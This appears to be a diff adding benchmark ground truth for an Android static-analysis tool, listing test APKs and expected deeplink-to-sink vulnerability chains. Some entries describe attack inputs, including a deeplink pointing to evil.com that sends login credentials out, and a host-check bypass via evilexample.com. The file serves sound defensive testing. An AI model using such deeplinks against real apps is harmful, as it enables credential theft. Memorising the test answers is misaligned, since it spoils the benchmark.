@@ -1,0 +1,211 @@
+{
+  "schema_version": "0.1",
+  "description": "ReachScope 评测语料 ground truth。APK 不入库，只记文件名与 sha256；语料目录由 --corpus-dir 指定。expectation 的 status 由 scripts/benchmark/run_benchmark.py 计算：detected / partial / miss / out_of_vocabulary；阴性检查（expect_no_chain）单列为 no_chain_ok / unexpected_chain，不混进检出率。",
+  "cases": [
+    {
+      "id": "ovaa-1.0.0",
+      "apk": "app-debug.apk",
+      "sha256": "073d87a2bcbfcd539146854681d4968960dbee0209673b17cdbe1aaed6705233",
+      "package": "oversecured.ovaa",
+      "source": "https://github.com/oversecured/ovaa/releases/tag/1.0.0",
+      "role": "positive",
+      "notes": "Oversecured 官方的漏洞聚合 App；README 列出 18 类漏洞，其中 #3/#4 正好落在本工具的轴（深链 → WebView）。#1 的凭据外泄走网络请求，#2 依赖攻击者 App 回传 Intent 结果，均不在当前 sink 词表内。",
+      "expectations": [
+        {
+          "id": "ovaa-webview-deeplink",
+          "ground_truth": "README #3/#4：oversecured://ovaa/webview?url=... 经 DeeplinkActivity 解析后以 Intent extra 启动未导出的 WebViewActivity，WebViewActivity 直接 loadUrl(url)；host 校验 host.endsWith(\"example.com\") 可被 evilexample.com 绕过。",
+          "entry": {
+            "kind": "deeplink",
+            "uri": "oversecured://ovaa/webview"
+          },
+          "sinks": ["webview"],
+          "accept_partial": ["cross_component"],
+          "notes": "真正的 sink（loadUrl）在另一个未导出 Activity 里；cross_component 只算第一跳。"
+        },
+        {
+          "id": "ovaa-login-deeplink",
+          "ground_truth": "README #1：oversecured://ovaa/login?url=http://evil.com/ 把任意 login_url 写入本地，用户登录时用户名密码被 POST 到攻击者服务器。",
+          "entry": {
+            "kind": "deeplink",
+            "uri": "oversecured://ovaa/login"
+          },
+          "sinks": ["network"],
+          "out_of_vocabulary": true,
+          "notes": "网络外发 sink 不在 v0.2 的 SinkKind 词表内，只记录不判分。"
+        },
+        {
+          "id": "ovaa-grant-uri-deeplink",
+          "ground_truth": "README #2：oversecured://ovaa/grant_uri_permissions 让攻击者 App 通过 GRANT_PERMISSIONS 动作回传带 FLAG_GRANT_READ_URI_PERMISSION 的 Intent，从而读取未导出的 content provider。",
+          "entry": {
+            "kind": "deeplink",
+            "uri": "oversecured://ovaa/grant_uri_permissions"
+          },
+          "sinks": ["content_provider"],
+          "out_of_vocabulary": true,
+          "notes": "漏洞成立依赖攻击者组件的回传结果，不是 APK 内部的数据流，当前模型不覆盖。"
+        }
+      ]
+    },
+    {
+      "id": "rs-control",
+      "apk": "rs-control.apk",
+      "sha256": "674e239341b8019d3ce75752d24409aeb0caa5e73acae09065f44b64d12e8441",
+      "package": "com.example.app",
+      "source": "tests/fixtures/cases/01_positive_deeplink_bridge_sink（apktool b 重新打包）",
+      "role": "synthetic-positive",
+      "notes": "项目自带 fixture 重新打包成 APK，用于验证完整 CLI（apktool 解码 → 提取 → 判定）确实能产出 high 链；不是真实应用。",
+      "expectations": [
+        {
+          "id": "control-deeplink-webview",
+          "ground_truth": "myapp://open.example.com/web 深链 → MainActivity.loadUrl → 无来源校验的 @JavascriptInterface 桥读文件。",
+          "entry": {
+            "kind": "deeplink",
+            "uri": "myapp://open.example.com/web"
+          },
+          "sinks": ["webview"],
+          "notes": "fixture 的 intent-filter 用 pathPrefix=/web；报告里的 deeplink.path 预期为 /web。"
+        }
+      ]
+    },
+    {
+      "id": "androgoat-2.0.1",
+      "apk": "AndroGoat-2.0.1.apk",
+      "sha256": "3e6f6b538b82874dd94c0d8cdadd69ba54d49b59d2c7eb055073892e8a4fc0e0",
+      "role": "adversarial-negative",
+      "notes": "故意脆弱的靶场 App，但漏洞类型（存储、日志、硬编码、导出组件本身）不在本轴；用于观察工具是否会误报。",
+      "expectations": [
+        {
+          "id": "androgoat-showdata-no-chain",
+          "ground_truth": "ShowDataReceiver 只把收到的数据显示到通知/界面，没有本工具词表内的 sink。",
+          "entry": {"kind": "component", "name": "owasp.sat.agoat.ShowDataReceiver"},
+          "expect_no_chain": true
+        },
+        {
+          "id": "androgoat-splash-no-chain",
+          "ground_truth": "SplashActivity 无攻击者数据入口；仅做启动跳转。",
+          "entry": {"kind": "component", "name": "owasp.sat.agoat.SplashActivity"},
+          "expect_no_chain": true
+        }
+      ]
+    },
+    {
+      "id": "mastg-android-java-1.1",
+      "apk": "MASTG-Android-Java-1.1.apk",
+      "sha256": "fce864e59f05eb64e3d668783b757d66d4fe5022c8811a32af0b33e7d2f3cde5",
+      "role": "adversarial-negative",
+      "notes": "OWASP MASTG 靶场；含 2 个 JS 桥，但页面是固定 file:///android_asset/，桥不暴露给攻击者可控页面。",
+      "expectations": [
+        {
+          "id": "mastg-myactivity-no-chain",
+          "ground_truth": "MyActivity 只加载固定 assets 页面，WebView 的 URL 不来自 Intent/深链。",
+          "entry": {"kind": "component", "name": "sg.vp.owasp_mobile.OMTG_Android.MyActivity"},
+          "expect_no_chain": true
+        }
+      ]
+    },
+    {
+      "id": "dvba-1.1.0",
+      "apk": "DVBA-1.1.0.apk",
+      "sha256": "76c308fac6a655a3534771777780e004feb1d91be032857768c891b2baf40ba6",
+      "role": "adversarial-negative",
+      "notes": "Damn Vulnerable Bank；已知漏洞不在本轴。",
+      "expectations": []
+    },
+    {
+      "id": "insecurebankv2-2.3.1",
+      "apk": "InsecureBankv2-2.3.1.apk",
+      "sha256": "b18af2a0e44d7634bbcdf93664d9c78a2695e050393fcfbb5e8b91f902d194a4",
+      "role": "adversarial-negative",
+      "notes": "经典靶场；已知漏洞不在本轴。",
+      "expectations": [
+        {
+          "id": "insecurebankv2-broadcast-no-chain",
+          "ground_truth": "MyBroadCastReceiver 只记录收到的广播内容，没有本工具词表内的 sink。",
+          "entry": {"kind": "component", "name": "com.android.insecurebankv2.MyBroadCastReceiver"},
+          "expect_no_chain": true
+        }
+      ]
+    },
+    {
+      "id": "k9mail-24.0",
+      "apk": "k9mail-24.0.apk",
+      "sha256": "6b80ec681f0c882ca334f4d533778e6e50e814ee214db798d9e129a369a85af4",
+      "role": "real-negative",
+      "notes": "真实邮件客户端；11 个导出入口，已知 0 桥、0 深链到 sink。",
+      "expectations": [
+        {
+          "id": "k9mail-compose-no-chain",
+          "ground_truth": "mailto 深链进入 MessageCompose，URL 只填入收件人/主题字段，不流向 WebView/文件/桥。",
+          "entry": {"kind": "component", "name": "com.fsck.k9.activity.MessageCompose"},
+          "expect_no_chain": true
+        },
+        {
+          "id": "k9mail-oauth-callback-no-chain",
+          "ground_truth": "OAuth 回跳组件把 code/state 交回 AppAuth，不流向本工具词表内的 sink。",
+          "entry": {"kind": "component", "name": "net.openid.appauth.RedirectUriReceiverActivity"},
+          "expect_no_chain": true
+        }
+      ]
+    },
+    {
+      "id": "newpipe-0.29.1",
+      "apk": "newpipe-0.29.1.apk",
+      "sha256": "18447bfb1e06d113edc88df93f471827280de06f6f3d4dc42f56f28b9c1bab79",
+      "role": "real-negative",
+      "notes": "真实媒体客户端；RouterActivity 只做路由。",
+      "expectations": [
+        {
+          "id": "newpipe-router-no-chain",
+          "ground_truth": "http/https/vnd.youtube 深链进入 RouterActivity，只把 URL 解析后转跳主界面，不直接进入 WebView/桥/文件 sink。",
+          "entry": {"kind": "component", "name": "org.schabi.newpipe.RouterActivity"},
+          "expect_no_chain": true
+        },
+        {
+          "id": "newpipe-panic-no-chain",
+          "ground_truth": "PanicResponderActivity 只按固定配置执行退出/清空动作，不消费攻击者可控数据。",
+          "entry": {"kind": "component", "name": "org.schabi.newpipe.PanicResponderActivity"},
+          "expect_no_chain": true
+        }
+      ]
+    },
+    {
+      "id": "owncloud-4.8.4",
+      "apk": "owncloud-4.8.4.apk",
+      "sha256": "96bd21df0bec3fa3736b3bd0070c0b51891dc510a5a9808c195ce60da7772b4d",
+      "role": "real-negative",
+      "notes": "真实云盘客户端；OAuth 回跳深链存在但到不了 sink；资源引用未解析。",
+      "expectations": [
+        {
+          "id": "owncloud-login-deeplink-no-chain",
+          "ground_truth": "OAuth 回跳深链进入 LoginActivity，参数只用于换 token/切账号，不流向 WebView/文件/桥。",
+          "entry": {"kind": "component", "name": "com.owncloud.android.presentation.authentication.LoginActivity"},
+          "expect_no_chain": true
+        },
+        {
+          "id": "owncloud-receive-files-no-chain",
+          "ground_truth": "ReceiveExternalFilesActivity 接收外部文件 URI 后走上传流程，不把攻击者可控字符串交给 WebView/文件写入。",
+          "entry": {"kind": "component", "name": "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity"},
+          "expect_no_chain": true
+        }
+      ]
+    },
+    {
+      "id": "duckduckgo-5.298.1",
+      "apk": "duckduckgo-5.298.1.apk",
+      "sha256": "7a114c2a1fe3550b52b3f32274fd507a2d9cd2ba5f220cc0ef19cf757e67fad1",
+      "role": "scale-limit",
+      "skip": true,
+      "skip_reason": "82.8 MB / 83k smali / 471k 方法；v0.2 无降级索引，实测 20-40+ 分钟、峰值 RSS 3.7 GB，超出预算。",
+      "expectations": []
+    },
+    {
+      "id": "homeassistant-2026.8.4",
+      "apk": "homeassistant-2026.8.4.apk",
+      "sha256": "ed1ded69472f2fa87c20c975b3e5f628889ec304dc9eb6aa5c52ecb6bd4c4687",
+      "role": "scale-limit",
+      "skip": true,
+      "skip_reason": "38.7 MB；解码成功，索引阶段本机内存不足被终止。",
+      "expectations": []
+    }
+  ]
+}
